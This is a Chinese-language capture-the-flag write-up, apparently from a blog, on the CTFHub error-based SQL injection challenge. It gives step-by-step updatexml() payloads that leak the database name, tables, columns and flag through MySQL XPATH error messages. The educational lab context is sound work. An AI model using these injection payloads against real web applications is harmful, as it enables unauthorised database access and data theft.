---
title: CTFHub Web - SQL 报错注入
date: 2026-11-16
tags: [CTFHub, Web, SQL注入, 报错注入, updatexml]
excerpt: 当页面没有正常回显位时，利用 MySQL 的 updatexml() 函数人为制造报错，将查询结果拼接在错误信息中带出。
---

## 思路

进入靶场，输入 `1` 后页面正常返回新闻内容，但页面**没有任何形式的回显位**。尝试 `1' union select 1,2 #` 也不会在页面显示 `1` 和 `2`。
这种情况下，联合查询（UNION）失效。由于题目提示为“报错注入”，我们需要利用 MySQL 的报错机制，通过 `updatexml()` 或 `extractvalue()` 等函数，触发错误并将想要查询的数据作为错误信息的一部分返回。

## 问题

1. **报错函数的选择**：MySQL 中常用的报错函数有 `updatexml()`、`extractvalue()`。注意 `updatexml()` 在较新的 MySQL 版本（>= 5.1.5）中存在，且报错回显长度最大限制为 **32 个字符**。
2. **数据截取**：如果查出来的表名或 Flag 长度超过 32 个字符，由于报错回显长度限制，可能会显示不全。需要使用 `substr()` 进行截取，或者利用 `limit` 逐条获取。

## 解决

1. **验证报错注入**：输入 `1' and updatexml(1,concat(0x7e,database()),1) #`。页面成功返回报错信息：`XPATH syntax error: '~sqli'`。其中 `0x7e` 是 `~` 的十六进制，用于符合 XPATH 语法格式并方便我们定位结果。
2. **获取表名**：输入 `1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='sqli')),1) #`。
   页面报错返回：`XPATH syntax error: '~news,flag'`。确认存在 `flag` 表。
3. **获取字段名**：输入 `1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag')),1) #`。
   页面报错返回：`XPATH syntax error: '~flag'`。
4. **提取 Flag**：输入 `1' and updatexml(1,concat(0x7e,(select flag from flag)),1) #`。
   页面成功在报错信息中回显 `~ctfhub{...}` 格式的 Flag 内容。

> **💡 复盘总结**：
> 报错注入是在**无回显**场景下的重要利器。使用 `updatexml` 和 `extractvalue` 时，报错信息通常不能超过 32 位长度，如果 Flag 极长，通常配合 `substr(flag, 1, 32)` 和 `substr(flag, 32, 64)` 分段读取，或者用 `limit 0,1` 逐条爆破。在 CTF 中，绝大多数题目 Flag 长度较短，直接 `select` 就能完整带出。
